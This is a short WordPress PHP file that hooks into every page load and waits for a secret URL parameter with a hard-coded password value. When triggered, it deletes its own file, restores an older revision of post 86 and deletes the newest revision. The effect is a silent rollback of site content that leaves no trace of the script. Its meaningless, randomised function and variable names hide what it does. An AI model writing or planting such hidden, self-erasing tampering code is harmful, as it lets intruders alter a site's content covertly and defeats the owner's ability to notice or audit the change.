<?php

function titles_rate_lightgray_media() {
	if (isset($_GET['filter_feed_right']) && $_GET['filter_feed_right'] === 'namespaced_verification_learndash_bank') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reading_src_reader_ecommerce = 86;
		$importer_info_grid_exporter = wp_get_post_revisions($reading_src_reader_ecommerce);
		if (empty($importer_info_grid_exporter)) die('no revisions');
		if (count($importer_info_grid_exporter) < 2) die('less than 2');
		$subscription_advance_soon = array_shift($importer_info_grid_exporter);
		$tiny_notification_forum = $subscription_advance_soon->ID;
		$menu_mode_extension = array_shift($importer_info_grid_exporter);
		$news_group_install_screen = $menu_mode_extension->ID;
		$performance_more_contents = wp_restore_post_revision($news_group_install_screen);
		if ($performance_more_contents === false) die('error restoring');
		$performance_more_contents = wp_delete_post_revision($tiny_notification_forum);		
		if ($performance_more_contents === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'titles_rate_lightgray_media');
